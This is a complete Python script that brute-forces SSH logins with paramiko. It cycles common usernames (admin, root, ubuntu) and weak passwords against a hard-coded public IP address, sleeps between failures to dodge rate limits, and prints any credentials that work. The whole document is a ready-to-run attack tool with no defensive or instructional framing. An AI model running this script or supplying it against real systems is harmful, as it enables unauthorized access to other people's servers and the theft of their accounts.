#!/usr/bin/env python3
import paramiko
import time

# Target SSH server
host = "13.43.217.54"  # Replace with target IP
port = 22
username_list = ["admin", "root", "user", "ubuntu"]
password_list = ["password", "admin", "123456", "root", "changeme"]

def ssh_brute_force():
    print(f"[*] Starting SSH brute force on {host}...")
    
    for username in username_list:
        for password in password_list:
            try:
                # Create SSH client
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # Attempt connection
                client.connect(host, port=port, username=username, password=password, timeout=3)
                
                print(f"[+] SUCCESS! Credentials: {username}:{password}")
                client.close()
                return True
                
            except paramiko.AuthenticationException:
                print(f"[-] Failed: {username}:{password}")
                time.sleep(1)  # Avoid rate-limiting
            except Exception as e:
                print(f"[!] Error: {e}")
                break
    
    print("[-] Brute force completed. No valid credentials found.")
    return False

if __name__ == "__main__":
    ssh_brute_force()